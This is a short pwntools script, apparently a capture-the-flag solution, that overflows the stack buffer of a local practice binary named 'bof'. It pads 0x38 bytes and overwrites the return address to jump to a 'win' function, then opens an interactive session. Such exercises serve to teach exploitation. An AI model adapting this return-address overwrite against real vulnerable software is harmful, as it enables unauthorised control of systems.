from pwn import *

e = ELF('./bof')

p = e.process()

win = e.sym['win']

pay = b''
pay += b'A'*0x38
pay += p64(win)

p.sendline(b'A')
p.sendline(b'A')
p.send(pay)

p.interactive()
